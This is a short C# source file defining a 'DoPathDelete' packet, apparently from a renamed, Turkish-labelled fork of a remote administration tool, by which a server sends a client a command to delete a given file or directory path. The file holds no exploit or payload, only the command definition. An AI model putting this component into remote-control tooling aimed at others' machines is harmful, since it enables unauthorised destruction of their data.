using System;
using xServer.KuuhakuCekirdek.Ağ;
using xServer.Enumlar2;

namespace xServer.KuuhakuCekirdek.Paketler.ServerPaketleri
{
    [Serializable]
    public class DoPathDelete : IPacket
    {
        public string Path { get; set; }

        public DizinTürleri DizinTürleri { get; set; }

        public DoPathDelete()
        {
        }

        public DoPathDelete(string path, DizinTürleri pathtype)
        {
            this.Path = path;
            this.DizinTürleri = pathtype;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}